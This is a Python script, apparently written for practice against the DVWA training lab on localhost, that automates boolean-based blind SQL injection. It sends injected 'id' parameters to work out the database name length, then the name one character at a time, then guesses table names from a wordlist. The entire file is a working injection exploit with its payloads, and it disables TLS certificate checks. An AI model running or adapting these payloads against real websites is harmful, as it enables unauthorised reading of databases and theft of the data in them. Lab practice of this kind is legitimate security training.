import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://127.0.0.1/dvwa/vulnerabilities/sqli_blind/"
cookies = dict(security='low', PHPSESSID="t1kqiierd4f8fbrl83aveplg6h")
length = 0

print("<--The length of databasename-->")
for i in range(12):
    payload1 = {
        "id":f"1' and length(database())={i} #",
        "Submit":"Submit"
    }

    res = requests.get(url=url, params=payload1, cookies=cookies, verify=False)
    if "User ID exists in the database" in res.text:
        length = i
        break

print(f'The length of database name is {length}.')

print('-'*30)

print("<--The name of database-->")
databasename = ''
for i in range(length):
    for j in range(65, 123):
        payload2 = {
            "id":f"1' and ascii(substr(database(),{i+1},1))={j} #",
            "Submit":"Submit"
        }
        res_name = requests.get(url=url, params=payload2, cookies=cookies, verify=False)
        if "User ID exists in the database" in res_name.text:
            databasename += chr(j)
            break
print(f'The name of database is {databasename}.')

print('-'*30)

print(f"<--The table of database {databasename}-->")
with open('common_table_names', 'r') as table_names:
    for table_name in table_names:
        payload3 = {
            "id": f"1' and exists(select * from {databasename}.{table_name.strip()}) #",
            "Submit": "Submit"
        }
        res_table = requests.get(url=url, params=payload3, cookies=cookies, verify=False)
        if "User ID exists in the database" in res_table.text:
            print(f'Find table-->{table_name.strip()}')